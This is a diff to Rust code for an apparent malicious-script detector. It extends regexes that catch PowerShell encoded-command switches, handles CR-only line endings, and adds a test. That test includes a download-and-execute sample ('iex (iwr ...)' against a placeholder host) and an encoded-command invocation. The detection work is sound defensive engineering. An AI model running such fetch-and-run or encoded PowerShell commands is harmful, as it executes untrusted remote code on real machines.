@@ -138,14 +138,14 @@ static RUNDLL: LazyLock<Regex> = LazyLock::new(|| {
 });
 static POWERSHELL_ENC: LazyLock<Regex> = LazyLock::new(|| {
     rx(
-        r#"\b(?:powershell|pwsh|powershell_ise)(?:\.exe)?\b.*?\s[-/]e(?:c|nc?o?d?e?d?c?o?m?m?a?n?d?)?\s+["']?[a-z0-9+/=]{40,}"#,
+        r#"\b(?:powershell|pwsh|powershell_ise)(?:\.exe)?\b.*?\s["\']?[-/]e(?:c|nc?o?d?e?d?c?o?m?m?a?n?d?)?["\']?\s+["']?[a-z0-9+/=]{40,}"#,
     )
 });
 /// The same switch, but the operand is a variable or an expansion, not text: the
 /// check cannot read what runs.
 static POWERSHELL_ENC_VARIABLE: LazyLock<Regex> = LazyLock::new(|| {
     rx(
-        r#"\b(?:powershell|pwsh|powershell_ise)(?:\.exe)?\b.*?\s[-/]e(?:c|nc?o?d?e?d?c?o?m?m?a?n?d?)?\s+["']?[%$(@]"#,
+        r#"\b(?:powershell|pwsh|powershell_ise)(?:\.exe)?\b.*?\s["\']?[-/]e(?:c|nc?o?d?e?d?c?o?m?m?a?n?d?)?["\']?\s+["']?[%$(@]"#,
     )
 });
 static HIDDEN_WINDOW: LazyLock<Regex> = LazyLock::new(|| {
@@ -283,7 +283,9 @@ fn script_lines(text: &str, flavor: Flavor) -> Vec<Logical> {
     let mut current: Option<Logical> = None;
     let mut joined = 0usize;
     let mut offset = 0usize;
-    for (index, physical) in text.split('\n').enumerate() {
+    // A file with only CR line ends is still lines.
+    let separator = if text.contains('\n') { '\n' } else { '\r' };
+    for (index, physical) in text.split(separator).enumerate() {
         let start = offset;
         offset += physical.len() + 1;
         let raw = physical.strip_suffix('\r').unwrap_or(physical);
@@ -752,6 +754,15 @@ mod tests {
                 "{line}"
             );
         }
+    }
+
+    #[test]
+    fn a_quoted_switch_and_cr_only_lines_are_read() {
+        assert_eq!(ps(&format!("powershell \"-enc\" {B64}")).len(), 1);
+        assert_eq!(
+            ps("# header\riex (iwr https://x.example.invalid/a)").len(),
+            1
+        );
     }
 
     #[test]
